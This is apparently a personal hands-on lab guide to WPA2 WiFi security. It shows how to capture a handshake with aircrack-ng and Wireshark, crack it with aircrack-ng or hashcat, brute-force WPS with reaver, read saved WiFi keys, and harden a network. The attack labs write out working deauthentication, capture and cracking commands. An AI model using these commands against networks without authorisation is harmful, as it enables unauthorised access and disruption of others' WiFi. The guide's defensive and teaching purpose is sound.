# WiFi Security — Hands-on Guide 📶🔒

Learn how WiFi attacks work **so you can defend WiFi** — using Kali, the
aircrack-ng suite, and **Wireshark**.

> ⚠️ **Only on your OWN access point, or one you have written permission to test.**
> Capturing or cracking someone else's WiFi is illegal. Every step below is for
> your own router in your own home lab. This is exactly how professional
> pentesters practice — on authorized targets.

---

## 0. How WPA2 actually works (the thing we attack)

- Your WiFi password (PSK) is never sent over the air.
- When a device joins, the AP and client run a **4-way handshake** (4 EAPOL
  messages) to prove they both know the password and to derive session keys.
- An attacker **captures that handshake** and then tries passwords **offline**
  against it (the handshake contains enough to verify a guess).
- So WPA2's real weakness is a **weak/guessable password**. **WPA3** fixes this
  with SAE (Dragonfly), which stops offline guessing.

**This is the whole game:** capture the handshake → guess the password offline.

---

## 1. Hardware you need

- A **USB WiFi adapter that supports monitor mode + packet injection**
  (e.g. Alfa AWUS036ACH / AWUS036NHA, or any chipset like Atheros AR9271,
  Ralink RT3070, Realtek RTL8812AU).
- Your laptop's **built-in WiFi usually can't do this inside a VM** — you must
  pass a **USB adapter** through to Kali: VirtualBox → VM Settings → USB → add
  the adapter, then in Kali check it with `iwconfig` / `ip link`.

---

## 2. Lab 1 — Recover YOUR OWN saved WiFi password (easy win, no special HW)

Forgot your own WiFi password? Read it from a device already connected to it.

**Windows (this laptop):**
```powershell
netsh wlan show profiles
netsh wlan show profile name="YOUR-WIFI-NAME" key=clear
```
Look at **Key Content** = the password.

**Linux:**
```bash
sudo cat /etc/NetworkManager/system-connections/*.nmconnection | grep -i psk
```

---

## 3. Lab 2 — Capture a WPA2 handshake (your own AP)

### Option A — aircrack-ng suite (the standard way)
```bash
sudo airmon-ng start wlan0                 # put the adapter in monitor mode -> wlan0mon
sudo airodump-ng wlan0mon                  # list nearby APs; note YOUR BSSID + channel
# focus on your AP and write a capture file:
sudo airodump-ng -c <CH> --bssid <YOUR-AP-MAC> -w capture wlan0mon
# in a 2nd terminal, force a reconnect so you catch the handshake:
sudo aireplay-ng --deauth 5 -a <YOUR-AP-MAC> wlan0mon
# watch the top-right of airodump for:  WPA handshake: <AP-MAC>
```

### Option B — Wireshark (capture + SEE the handshake) 🦈
1. `sudo airmon-ng start wlan0` (monitor mode).
2. Open **Wireshark** → select `wlan0mon` → start capture.
3. Apply the display filter:  **`eapol`**
   → you'll see the **4 EAPOL messages** = the WPA 4-way handshake.
4. Trigger a reconnect (the `aireplay-ng --deauth` above) to capture it live.
5. **File → Save As** → `capture.pcapng`. (For aircrack you can also export as
   `.cap`, or just use the airodump `.cap` from Option A.)

> Wireshark doesn't crack — it **captures and proves** you have all 4 handshake
> messages, which is what you explain in an interview.

---

## 4. Lab 3 — Crack the captured handshake (offline, your own AP)

```bash
# make a wordlist (or use /usr/share/wordlists/rockyou.txt — gunzip it first)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <YOUR-AP-MAC> capture.cap
```
If your password is in the list → `KEY FOUND! [ your-password ]`.
Faster with a GPU: convert and use **hashcat**:
```bash
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 5. Lab 4 — Analyze the handshake in Wireshark (interview gold) 🦈

Open your capture, filter `eapol`, and walk the **4-way handshake**:

| Msg | Direction | What it carries |
|-----|-----------|-----------------|
| 1 | AP → Client | **ANonce** (AP's random number) |
| 2 | Client → AP | **SNonce** + MIC (client proves it has the key) |
| 3 | AP → Client | Install key + MIC |
| 4 | Client → AP | ACK |

Also useful filters: `wlan.fc.type_subtype == 0x08` (beacons),
`wlan.fc.type_subtype == 0x0c` (deauth — you'll see your dauth attack!),
`wlan.fc.type_subtype == 0x04` (probe requests).

> Being able to point at EAPOL msg 1–4 in Wireshark and explain nonces + MIC is
> what separates you from people who just run a tool.

---

## 6. Other attacks to understand (concept)

- **WPS PIN attack** — many routers have WPS; its 8-digit PIN is brute-forceable
  (`reaver -i wlan0mon -b <AP-MAC> -vv`). Defense: **turn WPS off**.
- **Evil Twin / rogue AP** — attacker clones your SSID to phish the password
  (tools: airgeddon, wifiphisher). Defense: WPA3, 802.1X, user awareness.
- **Deauth / DoS** — floods deauth frames to knock clients off (you used one
  above to force the handshake). Defense: **802.11w / Protected Management
  Frames (PMF)**.

---

## 7. Defense — how to secure YOUR WiFi (the point of all this)

- Use **WPA3** (or WPA2 with a **long random passphrase**, 15+ chars).
- **Disable WPS.**
- Enable **PMF / 802.11w** (stops deauth attacks).
- Separate **guest + IoT** onto their own SSID/VLAN (ties into the SOC project).
- Hide nothing important behind "hidden SSID" or MAC filtering — they're trivial
  to bypass; rely on strong WPA3 instead.

---

## 8. Interview talking points

> "WiFi's weak point is the passphrase. An attacker captures the WPA2 4-way
> handshake — I can show the four EAPOL messages in Wireshark — and then guesses
> the password offline with aircrack-ng or hashcat. The fixes are WPA3, which
> stops offline guessing with SAE, a long passphrase, disabling WPS, and
> Protected Management Frames to stop deauth. I practice all of this against my
> own access point in a lab."

---

## Tools used
Kali Linux · aircrack-ng suite (airmon-ng, airodump-ng, aireplay-ng, aircrack-ng)
· **Wireshark** · hashcat · reaver · a monitor-mode USB WiFi adapter
